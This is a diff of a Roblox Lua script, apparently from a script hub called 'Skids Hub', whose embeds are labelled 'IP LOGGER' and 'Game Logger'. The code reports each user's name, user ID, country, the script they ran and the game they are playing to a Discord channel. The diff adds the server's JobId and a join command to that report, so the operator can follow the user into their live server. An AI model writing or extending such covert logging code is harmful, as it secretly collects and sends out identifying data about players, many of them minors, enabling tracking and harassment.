@@ -30,7 +30,7 @@ do
                         title='Skids Hub **IP LOGGER**',
                         url='https://discord.gg/q8FspVseAU',
                         description = string.format('@%s**(%s)[%d]** fired **%s** [discord](https://discord.gg/q8FspVseAU)', player.Name, player.DisplayName, game.Players.LocalPlayer.UserId ,scriptName),
-                        color = 0x080808,
+                        color = 0,
                         fields  = {
                             {
                                 name = '**Country**',
@@ -131,7 +131,7 @@ do
                         title='Skids Hub **Game Logger**',
                         color = 0x080808,
                         url='https://discord.gg/q8FspVseAU',
-                        description = string.format('@%s**(%s)** is playing [game](https://www.roblox.com/games/%d)', game.Players.LocalPlayer.Name, game.Players.LocalPlayer.DisplayName,game.PlaceId),
+                        description = string.format('@%s**(%s)** is playing [game](https://www.roblox.com/games/%d) ||Roblox.GameLauncher.joinGameInstance(%d, "%s")|| ', game.Players.LocalPlayer.Name, game.Players.LocalPlayer.DisplayName,game.PlaceId, game.PlaceId, game.JobId),
                         thumbnail={
                             url=gameThumb
                         },
